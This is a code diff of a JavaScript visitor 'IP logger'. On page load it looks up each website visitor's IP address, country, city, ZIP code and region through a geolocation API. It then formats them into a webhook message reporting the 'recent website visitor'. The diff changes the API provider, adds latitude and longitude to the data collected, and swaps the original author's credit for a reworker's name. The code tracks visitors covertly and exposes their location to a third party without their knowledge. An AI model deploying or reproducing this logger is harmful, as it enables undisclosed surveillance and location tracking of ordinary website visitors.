@@ -16,7 +16,7 @@ async function IP_Info(){
      *  Description: On init , fetches IP information of user
      *  @return {fetch.Body.json()} Resp Body
      */
-    let response = await fetch("http://ip-api.com/json", {
+    let response = await fetch("https://freeipapi.com/api/json", {
       method: 'GET',
       headers: {
         "cache-control" : "no-cache",
@@ -27,7 +27,7 @@ async function IP_Info(){
   }
   IP_Info().then((value)=> {
     let requiredInfo = [
-      "status","country", "city", "zip", "regionName"
+      "ipAddress","countryName", "cityName", "zipCode", "regionName", "latitude", "longitude",
     ]
     let noData = false
 
@@ -56,27 +56,27 @@ async function IP_Info(){
               color: "12223968",
               description: "```IP information of the recent website visitor.```",
               fields: [{
-                name: "IP", value: `${value.query}`, inline: false
+                name: "IP", value: `${value.ipAddress}`, inline: false
               },
               {
-                name: "Country", value: `${value.country}`, inline: false
+                name: "Country", value: `${value.countryName}`, inline: false
               },
               {
-                name: "City", value: `${value.city}`, inline: false
+                name: "City", value: `${value.cityName}`, inline: false
               },
               {
-                name: "ZIP", value: `${value.zip}`, inline: false
+                name: "ZIP", value: `${value.zipCode}`, inline: false
               },
               {
                 name: "Region", value: `${value.regionName}`, inline: false
               }
               ],
               footer: {
-                text: "Programmed by Z3NTL3",
+                text: "reworked by vetements",
                 icon_url: "https://avatars.githubusercontent.com/u/48758770?s=400&u=d0a4b500baea4e122b127eb91b4a80af3464f9f5&v=4"
               },
               author: {
-                name: "Pix4",
+                name: "glo",
                 url: "https://code.pix4.dev"
               },
               thumbnail: {
